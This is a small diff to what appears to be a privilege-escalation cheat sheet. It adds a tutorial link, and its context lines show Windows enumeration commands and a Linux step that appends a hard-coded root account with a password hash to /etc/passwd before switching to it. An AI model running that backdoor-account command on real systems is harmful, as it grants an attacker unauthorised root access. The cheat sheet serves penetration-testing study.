@@ -33,6 +33,9 @@ REG QUERY HKLM\Software\Policies\Microsoft\Windows\Installer
 windows-privesc-check2.exe --dump -G
 
 ```
+https://www.fuzzysecurity.com/tutorials/16.html
+
+
 
 ### Linux
 ```
@@ -175,3 +178,7 @@ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
 
 su root2
 ```
+
+
+
+
